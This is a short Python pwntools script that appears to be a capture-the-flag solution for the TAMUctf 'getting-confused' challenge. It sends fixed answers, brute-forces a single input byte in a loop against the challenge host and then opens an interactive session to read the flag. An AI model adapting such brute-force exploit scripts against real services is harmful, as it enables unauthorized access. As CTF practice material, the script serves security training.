from pwn import *

e = ELF("./getting-confused")

context.binary = e.path


i = 0
while True:
  i += 1
  
  try:
    if "--remote" in sys.argv:
      p = remote("challenges.tamuctf.com", 4352)
    else:
      p = process(e.path)

    p.sendlineafter("floor.", "howdy")
    p.sendlineafter("...", "gig 'em")
    print(i)
    p.sendafter("?", chr(i))

    p.shutdown()
    p.recvuntil("{")

    p.interactive()

    break
  except EOFError:
    pass
